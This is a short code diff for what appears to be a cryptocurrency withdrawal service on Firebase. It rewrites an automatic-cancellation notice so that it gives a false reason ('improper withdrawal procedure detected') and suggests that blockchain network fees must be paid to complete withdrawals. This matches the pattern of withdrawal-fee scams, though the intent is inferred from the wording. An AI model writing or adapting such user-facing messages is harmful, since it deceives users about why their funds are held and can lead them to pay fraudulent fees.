@@ -57,7 +57,7 @@
               const msgRef = db.collection("messages").doc();
               transaction.set(msgRef, {
                 to: freshData.email,
-                message: `Your withdrawal of ${refundAmount} USDT was automatically cancelled after 10 minutes and refunded to your balance.`,
+                message: `WITHDRAWAL CANCELLED <br> Your withdrawal of ${refundAmount} USDT was cancelled due to an improper withdrawal procedure detected during processing. <br> Please note that blockchain network fees are required to complete and confirm withdrawal transactions. <br> For assistance, contact Support Team.`,
                 timestamp: firebase.firestore.FieldValue.serverTimestamp(),
                 read: false
               });
